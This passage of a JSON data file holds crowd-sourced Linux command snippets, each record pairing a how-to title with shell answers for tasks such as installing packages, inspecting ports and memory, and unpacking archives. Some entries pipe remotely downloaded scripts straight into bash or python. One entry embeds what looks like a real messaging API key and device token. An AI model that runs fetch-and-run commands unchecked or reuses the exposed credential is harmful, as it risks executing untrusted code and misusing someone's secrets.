nvm install node  # You don't need to worry about npm installation as nvm automatically  # installs it alongside node  # Please visit nvm github repo for more info: https://github.com/nvm-sh/nvm\n",
    "reg_date": "2021-10-11T22:09:34.000Z"
  },
  {
    "id": 3365,
    "keyword": null,
    "link": null,
    "title": " linux install ping",
    "description": "apt-get update apt-get install iputils-ping \n",
    "reg_date": "2021-10-11T22:09:34.000Z"
  },
  {
    "id": 3366,
    "keyword": null,
    "link": null,
    "title": " linux install pip",
    "description": "apt-get install python-pip\t#python 2 apt-get install python3-pip\t#python 3\nsudo apt install python3-pip  on Fedora sudo yum install python3-pip\n#Debian/Unbuntu apt-get install python-pip\t#python 2 apt-get install python3-pip\t#python 3  #CentOS/RHEL yum install epel-release  yum install python-pip  #Fedora dnf install python-pip\t#Python 2 dnf install python3\t\t#Python 3  #Arch Linux pacman -S python2-pip\t        #Python 2 pacman -S python-pip\t        #Python 3  #openSUSE zypper install python-pip\t#Python 2 zypper install python3-pip\t#Python 3  #Some usefull commands pip install packageName \t# Install <packageName> pip uninstall packageName\t# Uninstall <packageName> pip search packageName\t\t# Search <packageName>\napt install python3-pip # python 3\n# First run sudo apt-get update # And then sudo apt-get install python3-pip # Tested on ubuntun 20 (linux)\n//IF you have problem with your pip try the oldest one :] curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py pip install xlrd --upgrade\n",
    "reg_date": "2021-10-11T22:09:34.000Z"
  },
  {
    "id": 3367,
    "keyword": null,
    "link": null,
    "title": " linux install yarn",
    "description": "curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list sudo apt update && sudo apt install yarn\ncurl -o- -L https://yarnpkg.com/install.sh | bash \ncurl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list \n",
    "reg_date": "2021-10-11T22:09:34.000Z"
  },
  {
    "id": 3368,
    "keyword": null,
    "link": null,
    "title": " linux ip addr add",
    "description": "sudo ip addr add 192.168.50.5/24 dev eth1\n",
    "reg_date": "2021-10-11T22:09:34.000Z"
  },
  {
    "id": 3369,
    "keyword": null,
    "link": null,
    "title": " linux kernel type cli command",
    "description": "uname -r\n",
    "reg_date": "2021-10-11T22:09:34.000Z"
  },
  {
    "id": 3370,
    "keyword": null,
    "link": null,
    "title": " linux kill all python processes",
    "description": "sudo pkill python sudo pgrep python\nsudo pkill python  or sudo pkill python3\nsudo pkill -9 python\nps -elf | grep python kill -9 <whatever_the_PID_is>\n",
    "reg_date": "2021-10-11T22:09:34.000Z"
  },
  {
    "id": 3371,
    "keyword": null,
    "link": null,
    "title": " linux lien symbolique",
    "description": "ln -s dir/file /var/dir/file_symbolic\nln &ndash;s /opt/file /opt/file_symbolic\n",
    "reg_date": "2021-10-11T22:09:35.000Z"
  },
  {
    "id": 3372,
    "keyword": null,
    "link": null,
    "title": " linux list application installation",
    "description": "Use this command on ubuntu: > sudo dpkg --listfiles [appname]\n",
    "reg_date": "2021-10-11T22:09:35.000Z"
  },
  {
    "id": 3373,
    "keyword": null,
    "link": null,
    "title": " linux list directories",
    "description": "for d in */ ; do     echo \"$d\" done\nls -d */\nfind . -type f -follow -print\n",
    "reg_date": "2021-10-11T22:09:35.000Z"
  },
  {
    "id": 3374,
    "keyword": null,
    "link": null,
    "title": " linux list files by size mb",
    "description": "ls -l --block-size=M\n",
    "reg_date": "2021-10-11T22:09:35.000Z"
  },
  {
    "id": 3375,
    "keyword": null,
    "link": null,
    "title": " linux list services",
    "description": "## List all services systemctl list-units  --type=service  ## List running services systemctl list-units  --type=service  --state=running  ## List all svc in simplified way service --status-all\nservice --status-all service --status-all | more service --status-all | grep ntpd service --status-all | less\n$ systemctl list-units --type=service\n$ sudo service httpd status httpd is stopped \n$ pstree | head -n 5\n$ sudo service httpd status httpd is stopped\n",
    "reg_date": "2021-10-11T22:09:36.000Z"
  },
  {
    "id": 3376,
    "keyword": null,
    "link": null,
    "title": " linux loop over all arguments one by one",
    "description": "for var in \"$@\" do     echo \"$var\" done\n",
    "reg_date": "2021-10-11T22:09:36.000Z"
  },
  {
    "id": 3377,
    "keyword": null,
    "link": null,
    "title": " linux ls directories only",
    "description": "ls -d */\n",
    "reg_date": "2021-10-11T22:09:36.000Z"
  },
  {
    "id": 3378,
    "keyword": null,
    "link": null,
    "title": " linux memory cache clear",
    "description": "# clear pagecache only. sync; echo 1 > /proc/sys/vm/drop_caches  # clear dentries and inodes. sync; echo 2 > /proc/sys/vm/drop_caches  # clear pagecache, dentries and inodes. sync; echo 3 > /proc/sys/vm/drop_caches \nsudo sync; echo 3 > /proc/sys/vm/drop_caches\n",
    "reg_date": "2021-10-11T22:09:36.000Z"
  },
  {
    "id": 3379,
    "keyword": null,
    "link": null,
    "title": " linux memory usage",
    "description": "// linux command for reporting used memory percentage $ free | grep Mem | awk '{print $3/$2 * 100.0}' 23.8171 \nfree -m\n$ free -t | awk 'NR == 2 {printf(\"Current Memory Utilization is : %.2f%\"), $3/$2*100}' or $ free -t | awk 'FNR == 2 {printf(\"Current Memory Utilization is : %.2f%\"), $3/$2*100}'  Current Memory Utilization is : 20.42% \nsudo dmidecode -t 17\nfor more information search this webside -- https://www.howtogeek.com/659529/how-to-check-memory-usage-from-the-linux-terminal/\nfree #------------------------------------------------------------ #total\tTotal installed memory #used\tMemory currently in use by running processes (used= total &ndash; free &ndash; buff/cache) #free\tUnused memory (free= total &ndash; used &ndash; buff/cache) #shared\tMemory shared by multiple processes #buffers\tMemory reserved by the OS to allocate as buffers when process need them #cached\tRecently used files stored in RAM #buff/cache\tBuffers + Cache #available\tEstimation of how much memory is available for starting new applications, without swapping.\n",
    "reg_date": "2021-10-11T22:09:36.000Z"
  },
  {
    "id": 3380,
    "keyword": null,
    "link": null,
    "title": " linux merge two pdfs",
    "description": "pdfunite file1.pdf file2.pdf merged.pdf\n",
    "reg_date": "2021-10-11T22:09:36.000Z"
  },
  {
    "id": 3381,
    "keyword": null,
    "link": null,
    "title": " linux mesuare request time http",
    "description": "curl -w \"\\n\\n%{time_connect} + %{time_starttransfer} = %{time_total}\\n\" www.google.com  \n",
    "reg_date": "2021-10-11T22:09:38.000Z"
  },
  {
    "id": 3382,
    "keyword": null,
    "link": null,
    "title": " linux mint taskbar disappeared",
    "description": "# In a terminal enter which xfce4-panel # This should return: /usr/bin/xfce4-panel # (just to make sure it is there)  # Try uninstalling and reinstall of the xfce panel using these steps: apt remove xfce4-panel # Ctrl+Alt+Backspace to log out, then log back in.  # You will have no panel at this point.  # Now kill the controller and delete the config files, Ctrl+Alt+T to open  # a terminal: pkill xfconfd; rm -rf ~/.config/xfce4/panel; rm -rf ~/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-panel.xml # (this should complete without terminal results)  # Finally reinstall the panel. Ctrl+Alt+T to open a terminal: apt install xfce4-panel # Again log out and back in. Check the panel\n",
    "reg_date": "2021-10-11T22:09:38.000Z"
  },
  {
    "id": 3383,
    "keyword": null,
    "link": null,
    "title": " linux nohup",
    "description": "nohup ./myscript.sh &\t\t\t\t\t\t# runs in background nohup ./myscript.sh\t\t\t\t\t\t\t# output is in nohup.out nohup ./myscript.sh > myscript.log &\t\t# output is in myscript.log\n",
    "reg_date": "2021-10-11T22:09:38.000Z"
  },
  {
    "id": 3384,
    "keyword": null,
    "link": null,
    "title": " linux open current directory in gui",
    "description": "xdg-open . \nnautilus .\n",
    "reg_date": "2021-10-11T22:09:38.000Z"
  },
  {
    "id": 3385,
    "keyword": null,
    "link": null,
    "title": " linux open file explorer from terminal",
    "description": "nautlius .\n",
    "reg_date": "2021-10-11T22:09:39.000Z"
  },
  {
    "id": 3386,
    "keyword": null,
    "link": null,
    "title": " linux open file manager",
    "description": "xdg-open .\n",
    "reg_date": "2021-10-11T22:09:39.000Z"
  },
  {
    "id": 3387,
    "keyword": null,
    "link": null,
    "title": " linux opened ports",
    "description": " netstat -pln \n",
    "reg_date": "2021-10-11T22:09:39.000Z"
  },
  {
    "id": 3388,
    "keyword": null,
    "link": null,
    "title": " linux query port use by pid",
    "description": "$ sudo netstat -nlp | grep :80 tcp  0  0  0.0.0.0:80  0.0.0.0:*  LISTEN  125004/nginx \n$ sudo ss -lptn 'sport = :80' State   Local Address:Port  Peer Address:Port               LISTEN  127.0.0.1:80        *:*                users:((\"nginx\",pid=125004,fd=12)) LISTEN  ::1:80              :::*               users:((\"nginx\",pid=125004,fd=11)) \n",
    "reg_date": "2021-10-11T22:09:39.000Z"
  },
  {
    "id": 3389,
    "keyword": null,
    "link": null,
    "title": " linux ram info",
    "description": "sudo lshw -short -C memory\nsudo dmidecode --type 17\nfree -mh\nsudo dmidecode | grep -A 15 Memory\nsudo dmidecode -t 17\n#Without root (total memory, available memory, etc) less /proc/meminfo vmstat -s free -mh #Or you can just look at the 4th and 5th line of \"top\" command top #And press \"m\" letter from the keyboard while looking at \"top\"  #for a better visualization of free RAM  #With root access (Memory type, speed, free, ...) -> more infos sudo dmidecode -type memory\n",
    "reg_date": "2021-10-11T22:09:39.000Z"
  },
  {
    "id": 3390,
    "keyword": null,
    "link": null,
    "title": " linux ram size",
    "description": "$ cat /proc/meminfo\nfree -m\ngrep MemTotal /proc/meminfo\n",
    "reg_date": "2021-10-11T22:09:39.000Z"
  },
  {
    "id": 3391,
    "keyword": null,
    "link": null,
    "title": " linux recursively find directory by name",
    "description": "find / -type d -name \"apt\"  sudo find / -type d -name \"apt\"\n",
    "reg_date": "2021-10-11T22:09:39.000Z"
  },
  {
    "id": 3392,
    "keyword": null,
    "link": null,
    "title": " linux remove java 11",
    "description": "sudo apt remove openjdk-11* sudo apt remove icedtea*\nsudo update-alternatives --remove \"java\" \"/usr/lib/jvm/jdk[version]/bin/java\" \n",
    "reg_date": "2021-10-11T22:09:39.000Z"
  },
  {
    "id": 3393,
    "keyword": null,
    "link": null,
    "title": " linux remove large folder",
    "description": "cd yourdirectory perl -e 'for(<*>){((stat)[9]<(unlink))}'\n",
    "reg_date": "2021-10-11T22:09:40.000Z"
  },
  {
    "id": 3394,
    "keyword": null,
    "link": null,
    "title": " linux remove large number of files",
    "description": "cd yourdirectory perl -e 'for(<*>){((stat)[9]<(unlink))}'\n",
    "reg_date": "2021-10-11T22:09:40.000Z"
  },
  {
    "id": 3395,
    "keyword": null,
    "link": null,
    "title": " linux remove last line from file",
    "description": "sed '$d' <file> sed -i '$d' <file> # to edit in place\n# Basic syntax: sed -i '$d' input_file  # Note, -i means that the input_file will be modified in place\n",
    "reg_date": "2021-10-11T22:09:40.000Z"
  },
  {
    "id": 3396,
    "keyword": null,
    "link": null,
    "title": " linux remove last n lines from file",
    "description": "#remove last 80 lines from cars.csv head -n -80 cars.csv > tmp.csv && mv tmp.csv cars.csv\nsed '$d' <file> sed -i '$d' <file> # to edit in place\n",
    "reg_date": "2021-10-11T22:09:40.000Z"
  },
  {
    "id": 3397,
    "keyword": null,
    "link": null,
    "title": " linux remove lines from one file in another",
    "description": "If the files are sorted:  comm -23 file1 file2  -23 suppresses the lines that are in both files, or only in file 2.  If the files are not sorted, pipe them through sort first...  \n> sed '2,4d' file \ngrep -v \"pattern\" file > temp && mv temp file \n",
    "reg_date": "2021-10-11T22:09:40.000Z"
  },
  {
    "id": 3398,
    "keyword": null,
    "link": null,
    "title": " linux remove program",
    "description": "$ sudo apt-get remove package-name\n",
    "reg_date": "2021-10-11T22:09:40.000Z"
  },
  {
    "id": 3399,
    "keyword": null,
    "link": null,
    "title": " linux reove alias",
    "description": " unalias alias-name\n",
    "reg_date": "2021-10-11T22:09:40.000Z"
  },
  {
    "id": 3400,
    "keyword": null,
    "link": null,
    "title": " linux replace string in all files",
    "description": "sed -i 's/old-text/new-text/g' input.txt\ncd /path/to/your/folder sed -i 's/foo/bar/g' * \n String Find and replace (folders/sub folders) > grep -rl \"old string\" . | xargs sed -i 's/old string/new string/g'   URL Find and replace  (folders/sub folders)  > grep -rl \"www\\.google\\.com\" . | xargs sed -i 's/www\\.google\\.com/www\\.yahoo\\.com/g' \n",
    "reg_date": "2021-10-11T22:09:40.000Z"
  },
  {
    "id": 3401,
    "keyword": null,
    "link": null,
    "title": " linux replace string in files recursively",
    "description": "find . -type f -name \"*.txt\" -exec sed -i'' -e 's/foo/bar/g' {} +\nsed -i 's/old-text/new-text/g' input.txt\nfind /home/www \\( -type d -name .git -prune \\) -o -type f -print0 | xargs -0 sed -i 's/subdomainA\\.example\\.com/subdomainB.example.com/g' \n",
    "reg_date": "2021-10-11T22:09:41.000Z"
  },
  {
    "id": 3402,
    "keyword": null,
    "link": null,
    "title": " linux repository list",
    "description": "//Debian repository source lists $ sudo nano /etc/apt/sources.list\n",
    "reg_date": "2021-10-11T22:09:41.000Z"
  },
  {
    "id": 3403,
    "keyword": null,
    "link": null,
    "title": " linux require a password to open a certain file",
    "description": "gpg -o personaltexts.gpg -c personal.txt // Encrypt File gpg -d personal.txt.gpg > outout_file.txt // Decrypt File\n",
    "reg_date": "2021-10-11T22:09:41.000Z"
  },
  {
    "id": 3404,
    "keyword": null,
    "link": null,
    "title": " linux restart command",
    "description": "reboot\nsudo reboot\nreboot -h now\n$ sudo shutdown -r now\n#To reset Terminal: $ reset  #To rerun/restart your bash.rc $ source ~/.bashrc   #To Restart your computer $ reboot\n",
    "reg_date": "2021-10-11T22:09:41.000Z"
  },
  {
    "id": 3405,
    "keyword": null,
    "link": null,
    "title": " linux run apk",
    "description": "$ snap install --devmode --beta anbox \n#To install APKs on Linux, you will need Anbox.  #To install Anbox:  #Pacman: pacman -S anbox  #Yay yay -S anbox  #Snap snap install anbox\n",
    "reg_date": "2021-10-11T22:09:41.000Z"
  },
  {
    "id": 3406,
    "keyword": null,
    "link": null,
    "title": " linux run background",
    "description": "nohup ./myscript.sh &\t\t\t\t\t\t# runs in background nohup ./myscript.sh\t\t\t\t\t\t\t# output is in nohup.out nohup ./myscript.sh > myscript.log &\t\t# output is in myscript.log\n[command] 2> /dev/null &\n",
    "reg_date": "2021-10-11T22:09:41.000Z"
  },
  {
    "id": 3407,
    "keyword": null,
    "link": null,
    "title": " linux run background nohup",
    "description": "nohup ./myscript.sh &\t\t\t\t\t\t# runs in background nohup ./myscript.sh\t\t\t\t\t\t\t# output is in nohup.out nohup ./myscript.sh > myscript.log &\t\t# output is in myscript.log\n",
    "reg_date": "2021-10-11T22:09:41.000Z"
  },
  {
    "id": 3408,
    "keyword": null,
    "link": null,
    "title": " linux run command in background and close terminal",
    "description": "nohup ./myscript.sh &\t\t\t\t\t\t# runs in background nohup ./myscript.sh\t\t\t\t\t\t\t# output is in nohup.out nohup ./myscript.sh > myscript.log &\t\t# output is in myscript.log\n",
    "reg_date": "2021-10-11T22:09:42.000Z"
  },
  {
    "id": 3409,
    "keyword": null,
    "link": null,
    "title": " linux run command in loop",
    "description": "// this is simple for loop with sleep  for i in {1..10}; do echo -n \"This is a test in loop $i \"; date ; sleep 2; done \n",
    "reg_date": "2021-10-11T22:09:42.000Z"
  },
  {
    "id": 3410,
    "keyword": null,
    "link": null,
    "title": " linux saber la distribución terminal",
    "description": "lsb_release -d\n",
    "reg_date": "2021-10-11T22:09:42.000Z"
  },
  {
    "id": 3411,
    "keyword": null,
    "link": null,
    "title": " linux scp with password",
    "description": "sshpass -p \"password\" scp -r user@example.com:/some/remote/path /some/local/path \n",
    "reg_date": "2021-10-11T22:09:42.000Z"
  },
  {
    "id": 3412,
    "keyword": null,
    "link": null,
    "title": " linux screen",
    "description": "Linux screen commands  # Starting Named Session $ screen -S session_name  # Close screen (with id) screen -X -S 12345 quit  #All screen list $screen -ls  #Reattach to a Linux Screen $ screen -r 12345 (screen id)  #Detach from Linux Screen Session $ Ctrl+a d\nscreen -list\nscreen -S your_session_name\nsudo apt install flameshot\n# Note, screen is useful for continuing processes (e.g. downloads) on a #\tremote server without having to stay logged in to the server  # Basic syntax: screen # This starts a new screen.   # After starting a long process, e.g., a download, detach with: CTRL+a d # To detach from screen, press CTRL+a, release, then press d  # To view active screens: screen -ls # The first numbers by each screen indicate the screen_number  # To resume active screen: screen -r # If there is only one active screen screen -r screen_number # If there are multiple active screens  # To close a screen after detaching: screen -X -S screen_number quit   # View all CTRL+ commands available in screen: CTRL+a ? \nscreen -S screen_name\n",
    "reg_date": "2021-10-11T22:09:42.000Z"
  },
  {
    "id": 3413,
    "keyword": null,
    "link": null,
    "title": " linux screen brightness command line",
    "description": "$ xrandr | grep \" connected\" | cut -f1 -d \" \" VGA1 $ xrandr --output VGA1 --brightness 0.7\n",
    "reg_date": "2021-10-11T22:09:42.000Z"
  },
  {
    "id": 3414,
    "keyword": null,
    "link": null,
    "title": " linux screen kill attached session",
    "description": "screen -X -S SCREENID kill \nscreen -X -S [session # you want to kill] kill \n",
    "reg_date": "2021-10-11T22:09:42.000Z"
  },
  {
    "id": 3415,
    "keyword": null,
    "link": null,
    "title": " linux search all directories for file",
    "description": "find / -iname 'book1*' \nfind /home/username/ -name \"*.err\" \n# syntax  # find *</path/to/dir> '(' *<Filter-1> *<and/or-operator> *<filter-2> ')'  # example  find . '(' -name \"Test*.pm\" -a ! -name 'Useless*' ')'\n",
    "reg_date": "2021-10-11T22:09:42.000Z"
  },
  {
    "id": 3416,
    "keyword": null,
    "link": null,
    "title": " linux search for file everywhere",
    "description": "find / -name \"filename\" \n",
    "reg_date": "2021-10-11T22:09:43.000Z"
  },
  {
    "id": 3417,
    "keyword": null,
    "link": null,
    "title": " linux search for files larger than",
    "description": "$ find . -type f -size +4G\n",
    "reg_date": "2021-10-11T22:09:43.000Z"
  },
  {
    "id": 3418,
    "keyword": null,
    "link": null,
    "title": " linux search for line in file",
    "description": "grep -R \"keyword\" /directory/\n",
    "reg_date": "2021-10-11T22:09:43.000Z"
  },
  {
    "id": 3419,
    "keyword": null,
    "link": null,
    "title": " linux see file system type",
    "description": "fsck -N /dev/sd**\n",
    "reg_date": "2021-10-11T22:09:43.000Z"
  },
  {
    "id": 3420,
    "keyword": null,
    "link": null,
    "title": " linux see used ports",
    "description": "# Any of the following sudo lsof -i -P -n | grep LISTEN sudo netstat -tulpn | grep LISTEN sudo lsof -i:22 # see a specific port such as 22 sudo nmap -sTU -O IP-address-Here\nsudo lsof -i:22\nnetstat -tulpn\nsudo netstat -tulpn | grep LISTEN  sudo lsof -i:22 # see a specific port such as 22\n## if you use linux sudo ss -tulw \n",
    "reg_date": "2021-10-11T22:09:43.000Z"
  },
  {
    "id": 3421,
    "keyword": null,
    "link": null,
    "title": " linux select pages from pdf",
    "description": "pdftk infile.pdf cat 12-15 output outfile.pdf\n",
    "reg_date": "2021-10-11T22:09:43.000Z"
  },
  {
    "id": 3422,
    "keyword": null,
    "link": null,
    "title": " linux set date timezone",
    "description": "# To view timezone timedatectl  # list all available timezones timedatectl list-timezones  # update timezone sudo timedatectl set-timezone your_time_zone \nsudo timedatectl set-timezone <your_time_zone>\nsudo timedatectl set-timezone America/New_York\ntimedatectl  Output ------------                       Local time: Tue 2019-12-03 16:30:44 UTC                   Universal time: Tue 2019-12-03 16:30:44 UTC                         RTC time: Tue 2019-12-03 16:30:44                        Time zone: Etc/UTC (UTC, +0000)        System clock synchronized: no systemd-timesyncd.service active: yes                  RTC in local TZ: no\n",
    "reg_date": "2021-10-11T22:09:43.000Z"
  },
  {
    "id": 3423,
    "keyword": null,
    "link": null,
    "title": " linux set env permanent",
    "description": "# for bash Bash as login shell will load /etc/profile, ~/.bash_profile, ~/.bash_login, ~/.profile in the order Bash as non-login interactive shell will load ~/.bashrc Bash as non-login non-interactive shell will load the configuration specified in environment variable $BASH_ENV  $cat ~/.profile #add lines at the bottom of the file:        export LD_LIBRARY_PATH=/usr/lib/oracle/11.2/client64/lib      export ORACLE_HOME=/usr/lib/oracle/11.2/client64        #OR  nano /etc/environment\n",
    "reg_date": "2021-10-11T22:09:43.000Z"
  },
  {
    "id": 3424,
    "keyword": null,
    "link": null,
    "title": " linux set python 3 as default",
    "description": "1. Check current version: $ python --version 2. get root permissions: $ sudo su 3. set python3 as default: $ update-alternatives --install /usr/bin/python python /usr/bin/python3 1 4. Done. (Check by $ python --version) \nsudo update-alternatives --install /usr/bin/python python /usr/bin/python3.4 1 sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 2 \nupdate-alternatives: error: no alternatives for python3  \n",
    "reg_date": "2021-10-11T22:09:44.000Z"
  },
  {
    "id": 3425,
    "keyword": null,
    "link": null,
    "title": " linux shell check if directory does not exists",
    "description": "if [ ! -d directory ]; then   mkdir directory fi\n",
    "reg_date": "2021-10-11T22:09:44.000Z"
  },
  {
    "id": 3426,
    "keyword": null,
    "link": null,
    "title": " linux show groups",
    "description": "cut -d: -f1 /etc/group | sort \ngroups groups userName-Here\n# to see the group joined by current user $ id   groups groups {USERNAME} groups vivek\ngroups\ngroups [user name] # [user name] : (optionnal) the user to list the group of #                           default is the one executing the command.\ngroups userName-Here\n",
    "reg_date": "2021-10-11T22:09:44.000Z"
  },
  {
    "id": 3427,
    "keyword": null,
    "link": null,
    "title": " linux show log file real time",
    "description": "$ sudo tail -f /var/log/apache2/access.log \n",
    "reg_date": "2021-10-11T22:09:44.000Z"
  },
  {
    "id": 3428,
    "keyword": null,
    "link": null,
    "title": " linux show number of cores",
    "description": "nproc # 8\n",
    "reg_date": "2021-10-11T22:09:45.000Z"
  },
  {
    "id": 3429,
    "keyword": null,
    "link": null,
    "title": " linux show version",
    "description": "cat /etc/os-release\ncat /proc/version\n",
    "reg_date": "2021-10-11T22:09:45.000Z"
  },
  {
    "id": 3430,
    "keyword": null,
    "link": null,
    "title": " linux speed test",
    "description": "curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python - \nsudo apt-get install gnupg1 apt-transport-https dirmngrexport INSTALL_KEY=379CE192D401AB61# Ubuntu versions supported: xenial, bionic# Debian versions supported: jessie, stretch, busterexport DEB_DISTRO=$(lsb_release -sc)sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys $INSTALL_KEYecho \"deb https://ookla.bintray.com/debian ${DEB_DISTRO} main\" | sudo tee  /etc/apt/sources.list.d/speedtest.listsudo apt-get update# Other non-official binaries will conflict with Speedtest CLI# Example how to remove using apt-get# sudo apt-get remove speedtest-clisudo apt-get install speedtest\nsudo apt-get install gnupg1 apt-transport-https dirmngr export INSTALL_KEY=379CE192D401AB61 export DEB_DISTRO=$(lsb_release -sc) sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys $INSTALL_KEY echo \"deb https://ookla.bintray.com/debian ${DEB_DISTRO} main\" | sudo tee  /etc/apt/sources.list.d/speedtest.list sudo apt-get update sudo apt-get install speedtest\n",
    "reg_date": "2021-10-11T22:09:45.000Z"
  },
  {
    "id": 3431,
    "keyword": null,
    "link": null,
    "title": " linux start mongodb",
    "description": "sudo systemctl start mongod \nsudo systemctl start mongod sudo systemctl stop mongod\nsudo mongod --fork --config /etc/mongod.conf\n",
    "reg_date": "2021-10-11T22:09:45.000Z"
  },
  {
    "id": 3432,
    "keyword": null,
    "link": null,
    "title": " linux swap flush",
    "description": "sudo swapoff -a; sudo swapon -a\n#!/bin/bash  free_mem=\"$(free | grep 'Mem:' | awk '{print $7}')\" used_swap=\"$(free | grep 'Swap:' | awk '{print $3}')\"  echo -e \"Free memory:\\t$free_mem kB ($((free_mem / 1024)) MiB)\\nUsed swap:\\t$used_swap kB ($((used_swap / 1024)) MiB)\" if [[ $used_swap -eq 0 ]]; then     echo \"No swap is in use.\" elif [[ $used_swap -lt $free_mem ]]; then     echo \"Freeing swap...\"     sudo swapoff -a     sudo swapon -a else     echo \"Not enough free memory. Exiting.\"     exit 1 fi\n",
    "reg_date": "2021-10-11T22:09:45.000Z"
  },
  {
    "id": 3433,
    "keyword": null,
    "link": null,
    "title": " linux symlink directory example",
    "description": "ln -s /mnt/external-drive ~/mydrive\n",
    "reg_date": "2021-10-11T22:09:45.000Z"
  },
  {
    "id": 3434,
    "keyword": null,
    "link": null,
    "title": " linux symlink file",
    "description": "ln -sf /path/to/file /path/to/symlink\n",
    "reg_date": "2021-10-11T22:09:46.000Z"
  },
  {
    "id": 3435,
    "keyword": null,
    "link": null,
    "title": " linux tar zip folder",
    "description": "tar -czvf name-of-archive.tar.gz /path/to/directory-or-file\ntar cf ostechnix.tar ostechnix/ # Here, c flag refers create new archive and f refers the file name.\n",
    "reg_date": "2021-10-11T22:09:46.000Z"
  },
  {
    "id": 3436,
    "keyword": null,
    "link": null,
    "title": " linux test if string exists in file",
    "description": "if grep -Fxq \"string\" file.txt; then  \techo \"Match\" else  \techo \"No match\" fi\nJust use grep with flags 'F' (fixed string), 'x' (exact match) and 'q' (quiet output) in order to check if a word string is in a file if ! grep -Fxq \"string\" file.txt; then #do some code...#; fi\n",
    "reg_date": "2021-10-11T22:09:46.000Z"
  },
  {
    "id": 3437,
    "keyword": null,
    "link": null,
    "title": " linux typing hebrew",
    "description": "setxkbmap -option grp:switch,grp:alt_shift_toggle,grp_led:scroll us,il\n",
    "reg_date": "2021-10-11T22:09:46.000Z"
  },
  {
    "id": 3438,
    "keyword": null,
    "link": null,
    "title": " linux unpack tar.gz file",
    "description": " tar xvzf file.tar.gz\ntar -zxvf file_name.tar.gz\n",
    "reg_date": "2021-10-11T22:09:46.000Z"
  },
  {
    "id": 3439,
    "keyword": null,
    "link": null,
    "title": " linux untar",
    "description": "tar -xzvf file.tar.gz\ntar -xvf filename.tar\ntar -xzf packed.tar.gz\ntar -xvf yourfile.tar.gz\ntar -xvf yourfile.tar\n",
    "reg_date": "2021-10-11T22:09:47.000Z"
  },
  {
    "id": 3440,
    "keyword": null,
    "link": null,
    "title": " linux unzip tar.gz",
    "description": "# Basic syntax: tar -zxvf file.tar.gz  # Where: #\t- x tells tar to extract the files #\t- v tells the command to list all of the files in the archive #\t- z tells the tar command to uncompress the file (gzip) #\t- f tells tar that you are going to give it a file name to work with\n tar xvzf file.tar.gz\ntar -xvf file.tar.gz\ntar zxvf file.tgz\ntar -xvf yourfile.tar.gz\ntar -xvzf community_images.tar.gz\n",
    "reg_date": "2021-10-11T22:09:47.000Z"
  },
  {
    "id": 3441,
    "keyword": null,
    "link": null,
    "title": " linux view environment variables",
    "description": "printenv\nENV_VAR=\"hello world\" printenv ENV_VAR\n#show all variable printenv  #result one variable echo $LOCALAPPDATA\n# Linux - Bash   # syntax  # export *<variable-name>=*<variable-value>;  # example  export ORACLE_SID='sales_database';\n",
    "reg_date": "2021-10-11T22:09:47.000Z"
  },
  {
    "id": 3442,
    "keyword": null,
    "link": null,
    "title": " linux view kernel version",
    "description": "cat /proc/version\nuname -r\nuname -r\n",
    "reg_date": "2021-10-11T22:09:47.000Z"
  },
  {
    "id": 3443,
    "keyword": null,
    "link": null,
    "title": " linux view services",
    "description": "service --status-all service --status-all | more service --status-all | grep ntpd service --status-all | less\n$ systemctl list-units --type=service\n$ sudo service httpd status httpd is stopped\n",
    "reg_date": "2021-10-11T22:09:47.000Z"
  },
  {
    "id": 3444,
    "keyword": null,
    "link": null,
    "title": " linux watchers limit",
    "description": "echo fs.inotify.max_user_watches=524288 | sudo tee /etc/sysctl.d/40-max-user-watches.conf && sudo sysctl --system\n",
    "reg_date": "2021-10-11T22:09:48.000Z"
  },
  {
    "id": 3445,
    "keyword": null,
    "link": null,
    "title": " linux what is curl",
    "description": "curl is a command line tool to transfer data to or from a server, using any of the supported protocols (HTTP, FTP, IMAP, POP3, SCP, SFTP, SMTP, TFTP, TELNET, LDAP or FILE). curl is powered by Libcurl. This tool is preferred for automation, since it is designed to work without user interaction\ncurl https://example.com/index.php?username=luffy&loggedin=true\ncurl --header \"Authorization: key=AAAAbh_xxx-nI:APBAwd91bGn1OssamQlG4R1v84yXOv-6oynz1i4eNltzQLd5ojIiFSHvnCFHJyA33QcRfeAMa5As2mjfEjkRA_XA-YM8gsqEQssm3Ykrn8FSBEwwwkot5KPWY0zMefYB1RZj1ZlZfsWy\" --header \"Content-Type: application/json\" -d '{\"to\": \"f8UQCp0VHqCrBR0Yeiwx0:APA91bHuqLN7Wp40U2Wt8LS3VcRipttiViYF4TXHKP1Rusdov542XEgUYaVk9GIAEM3Q2kHcME5D85BsyWg7vk3H3oLhKJdNQLSNyoxzfnhGAvuQo4BiTZ43sIdVGQ7t86WQDn6s9HBj\", \"data\": {\"status\": \"New information!!!\"}}' https://fcm.googleapis.com/fcm/send \n",
    "reg_date": "2021-10-11T22:09:48.000Z"
  },
  {
    "id": 3446,
    "keyword": null,
    "link": null,
    "title": " linux which process is using a port",
    "description": "$ sudo netstat -ltnp | grep ':80' \n",
    "reg_date": "2021-10-11T22:09:48.000Z"
  },
  {
    "id": 3447,
    "keyword": null,
    "link": null,
    "title": " linux which shell am i running",
    "description": "echo \"$SHELL\"\n",
    "reg_date": "2021-10-11T22:09:48.000Z"
  },
  {
    "id": 3448,
    "keyword": null,
    "link": null,
    "title": " linux xinput touchscreen",
    "description": "# take <output> with xrandr  xinput map-to-output <device> <output> \n",
    "reg_date": "2021-10-11T22:09:48.000Z"
  },
  {
    "id": 3449,
    "keyword": null,
    "link": null,
    "title": " linux zip a directory",
    "description": "zip -r filename.zip /path/to/folder1\nzip -r myfiles.zip mydir\nzip -r output_file.zip file1 folder1\n",
    "reg_date": "2021-10-11T22:09:49.000Z"
  },
  {
    "id": 3450,
    "keyword": null,
    "link": null,
    "title": " list all built-in commands you can run in linux",
    "description": "#it is used to list all built in commands in linux help\n",
    "reg_date": "2021-10-11T22:09:49.000Z"
  },
  {
    "id": 3451,
    "keyword": null,
    "link": null,
